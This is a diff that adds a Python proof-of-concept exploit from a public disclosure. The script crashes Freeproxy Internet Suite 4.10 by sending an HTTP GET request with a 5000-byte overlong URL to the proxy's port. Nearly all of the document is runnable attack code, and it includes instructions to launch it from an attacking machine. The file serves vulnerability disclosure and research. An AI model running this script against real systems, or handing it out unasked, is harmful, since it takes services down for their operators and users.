@@ -1,0 +1,55 @@
+# Exploit Title: Freeproxy Internet Suite 4.10 Remote DoS
+# Date: 01/03/2016
+# Exploit Author: Guillaume Kaddouch
+#   Twitter: @gkweb76
+#   Blog: https://networkfilter.blogspot.com
+#   GitHub: https://github.com/gkweb76/exploits
+# Vendor Homepage: http://www.handcraftedsoftware.org/
+# Software Link: http://www.handcraftedsoftware.org/index.php?page=download&op=getFile&id=2&title=FreeProxy-Internet-Suite
+# Version: 4.10.1751
+# Tested on: Windows 7 Family x64 (FR)
+# Category: DoS
+
+"""
+Disclosure Timeline:
+--------------------
+2016-01-29: Vulnerability discovered
+2016-01-30: Vendor contacted
+2016-03-01: Vulnerability published 
+
+ 
+Description :
+-------------
+A remote Denial Of Service exists in Freeproxy Internet Suite 4.10.1751 when sending a GET request to the proxy with an overly long URL. 
+ 
+
+Instructions:
+-------------
+- Starts Freeproxy Internet Suite
+- Run this exploit locally or from your remote attacking machine. Multiple sends may be necessary to crash the application.
+"""
+
+import socket
+
+host    = "192.168.135.132"
+port    = 8080
+
+junk    = '\x41' * 5000
+
+buffer  = "GET http://::../%s/index.html HTTP/1.1\r\n" % junk
+buffer += "Host: www.google.fr\r\n"
+buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n"
+buffer += "\r\n\r\n"
+
+try:
+    print "[*] Connecting to %s:%d" % (host, port)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    print "[*] Sending buffer %d bytes..." % len(junk)
+    s.connect((host, port))
+    s.send(buffer)
+    s.close()
+
+    print "[*] Done."
+except:
+    print "[-] Error connecting"
